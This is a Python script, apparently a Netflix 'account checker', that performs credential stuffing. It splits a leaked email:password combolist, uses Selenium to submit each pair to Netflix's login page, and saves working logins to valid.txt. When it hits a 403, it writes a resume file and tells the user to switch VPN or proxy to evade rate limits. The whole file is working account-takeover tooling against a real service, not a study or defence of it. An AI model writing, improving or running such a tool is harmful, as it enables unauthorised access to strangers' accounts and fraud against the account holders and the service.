import logging
import requests
import os
import sys
from pathlib import Path
from header import title
from header import user_options
from countries import find_IP
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver import ActionChains
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# ANSI color constants
WHITE = "\033[38;5;7m"
GREEN = "\033[38;5;46m"
RED = "\033[38;5;196m"
YELLOW = "\033[38;5;226m"
LIGHT_YELLOW = "\033[38;5;190m"
BRIGHT_WHITE = "\033[38;5;255m"
RESET = "\033[0m"

WAIT_TIMEOUT = 5


def splitter(filename='netflix.txt'):
    # Combo Splitter
    title()
    users = []
    passwords = []
    try:
        with open(filename, 'r') as net:
            for line in net:
                users.append(line.split(":")[0])
                passwords.append(line.split(":")[1].split(" ")[0])
            print(f"\n{WHITE}User : password combinations sorted.\n\nYou can now run the checker.")
            input("\n\nPress Enter...")
        return users, passwords
    except IndexError:
        print(
            f"\n\n{BRIGHT_WHITE}There is something wrong with the combolist.\nCheck for extra spaces, extra characters\nOr anything else that shouldn't be there.\nEnding.")
        sys.exit()
    except FileNotFoundError:
        print(
            f"\n\n{BRIGHT_WHITE}Combo-list not found. Place it in the main directory,\nand make sure it's named 'netflix.txt' (no capitalization).\nEnding.")
        sys.exit()


def main():
    ip_info = find_IP()
    details = [ip_info[0], ip_info[1], ip_info[2]]
    counter = 0
    hits = 0
    clear_page = 0
    directory = str(Path(__file__).parent)
    resume_flag = Path(directory, 'resume.txt').exists()

    page = "https://www.netflix.com/login"
    while True:
        logging.getLogger().setLevel(logging.CRITICAL)
        counter = 0
        title()
        print(f"\n{WHITE}Current IP: {details[0]} - Netflix's location: {details[1]}\n")
        user_options()
        options = input("Pick an option: ")
        while True:
            if options == "1":
                #Account Checker
                combos = splitter('resume.txt') if resume_flag else splitter()
                user = combos[0]
                passw = combos[1]
                title()
                if resume_flag:
                    print(f"{WHITE}\nResume file found. Resuming from given combo.")
                print(f"\n{WHITE}Current IP: {details[0]} - Netflix's location: {details[1]}\n")
                browser = None
                try:
                    browser_options = Options()
                    browser_options.add_argument(
                        'user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537')
                    browser = webdriver.Chrome(options=browser_options)
                    browser.set_window_size(500, 700)
                    wait = WebDriverWait(browser, WAIT_TIMEOUT)
                    while counter < len(user):
                        if len(user) == 0:
                            print(f"\n{YELLOW}No Accounts for current country.\n")
                            break
                        try:
                            print(
                                f"{WHITE}\n\r\rConnection Status:{GREEN} OK {WHITE}| {WHITE}Combo No.{counter}:{LIGHT_YELLOW} {user[counter]}:{passw[counter].strip()} {WHITE}| Result: ", end='')
                            browser.get(page)
                            try:
                                reject_btn = wait.until(EC.element_to_be_clickable((By.XPATH, '//button[@id="onetrust-reject-all-handler"]')))
                                reject_btn.click()
                            except Exception:
                                pass
                            try:
                                toggle_btn = wait.until(EC.presence_of_element_located((By.XPATH, '//button[@data-uia="login-toggle-button"]')))
                                if toggle_btn.text == "Use password":
                                    toggle_btn.click()
                            except Exception:
                                pass
                            login = wait.until(EC.presence_of_element_located((By.XPATH, '//input[@name="userLoginId"]')))
                            password = browser.find_element(By.XPATH, '//input[@name="password"]')
                            login.send_keys(user[counter])
                            password.send_keys(passw[counter].strip())
                            password.send_keys(Keys.TAB)
                            password.send_keys(Keys.ENTER)
                            try:
                                wait.until(lambda d: d.current_url != page or d.find_elements(By.XPATH, '//div[@id="loginErrorMessage"]'))
                            except Exception:
                                pass
                            if browser.current_url == 'https://www.netflix.com/login' or browser.find_elements(By.XPATH,
                                                                                                              '//div[@id="loginErrorMessage"]'):
                                print(f"{RED} Invalid Account", end='')
                            if browser.current_url == 'https://www.netflix.com/browse' or browser.find_elements(By.XPATH,
                                                                                                                '//div[@class="profiles-gate-container"]'):
                                print(f"{GREEN} Valid Account - Stored", end='')
                                hits += 1
                                with open('valid.txt', 'a') as valid:
                                    valid.write("{}:{}\n".format(user[counter], passw[counter]))
                        except Exception:
                            request = requests.get(page)
                            if request.status_code == 403:
                                print(
                                    f"{WHITE}\nConnection Status:{LIGHT_YELLOW} Too many requests:{RED} Access Denied \n\n{WHITE}Change VPN/Proxy and start the checker again to resume from current combo.\n")
                                with open('resume.txt', 'w') as resume:
                                    for i in range(counter, len(user)):
                                        resume.write("{}:{}\n".format(user[i], passw[i].strip()))
                                sys.exit()
                        if clear_page > 10:
                            title()
                            print(f"\n{WHITE}Current IP: {details[0]} - Netflix's location: {details[1]}\n")
                            clear_page = 0
                        counter += 1
                        clear_page += 1
                        browser.delete_all_cookies()
                        sys.stdout.write(f"{WHITE}\x1b7\x1b[0;14fHits: {hits} Valid Accounts (Tried {counter} out of {len(user)})\x1b8")
                        sys.stdout.flush()
                finally:
                    if browser:
                        browser.quit()

                print(f"\n{YELLOW}All done.")
                input(f"\n{YELLOW}Press Enter.")
                if resume_flag:
                    os.remove('resume.txt')
                break
            if options == "2":
                #Exit
                sys.exit()
            else:
                break


if __name__ == "__main__":
    main()
